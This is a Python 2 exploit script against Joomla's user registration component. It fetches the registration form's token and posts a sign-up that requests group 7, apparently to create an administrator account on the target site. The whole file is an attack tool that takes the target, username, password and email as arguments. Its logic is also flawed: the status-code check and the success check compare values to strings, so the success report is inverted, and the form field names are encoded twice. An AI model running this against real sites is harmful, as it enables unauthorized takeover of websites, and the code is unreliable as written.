#!/usr/bin/python
# Coded By Afrizal F.A

import re, sys, requests

print """
  ____ ___                      _____
 / ___/ _ \ _ __ ___  _   _ ___|___ / _ __
| |  | | | | '_ ` _ \| | | / __| |_ \| '__|
| |__| |_| | | | | | | |_| \__ \___) | |
 \____\___/|_| |_| |_|\__,_|___/____/|_|

By : Afrizal F.A
"""

web=sys.argv[1]
target=web + "/index.php?option=com_users&view=registration"
user=sys.argv[2]
passwd=sys.argv[3]
email=sys.argv[4]

ambil=requests.get(url=target)
print "[*] Check Connection : " + web

if not ambil.status_code == "200" :
    isi=ambil.content
    regex='<input type="hidden" name="(.*?)" value="1"'
    noken=re.findall(regex,isi)
    token=noken[0]
    print "[+] Token : " + token
    pyld={
    "jform%5Bname%5D" : user,
    "jform%5Busername%5D" : user,
    "jform%5Bpassword1%5D" : passwd,
    "jform%5Bpassword2%5D" : passwd,
    "jform%5Bemail1%5D" : email,
    "jform%5Bemail2%5D" : email,
    "jform%5Bgroups%5D%5B%5D" : "7",
    "option" : "com_users",
    "task" : "registration.register",
    token : "1"
    }
    print "[*] Exploiting : " + target
    exp=requests.post(url=target,data=pyld)
    raw_cek=exp.content
    cek=re.search("(created\w+)",raw_cek)
    if cek == "None" :
        print "[+] Exploit Status : Success"
    else :
        print "[-] Exploit Status : Failed"
